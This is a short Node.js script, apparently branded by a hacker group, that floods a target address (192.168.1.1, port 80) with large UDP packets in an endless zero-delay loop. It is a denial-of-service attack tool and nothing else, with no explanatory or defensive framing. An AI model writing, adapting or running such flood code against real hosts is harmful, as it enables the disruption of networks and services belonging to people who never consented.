import { createSocket } from 'dgram';
function start() {
  const socket = createSocket('udp4');
  const port = 80;
  const host = '192.168.1.1';
  setInterval(() => {
  const message = 'PaskoBlackHat - Danzxploit'.repeat(999);
    socket.send(Buffer.from(message), port, host, (error) => {
      if (error) {
        console.error(error);
      } else {}
    });
  },0);
}

start();
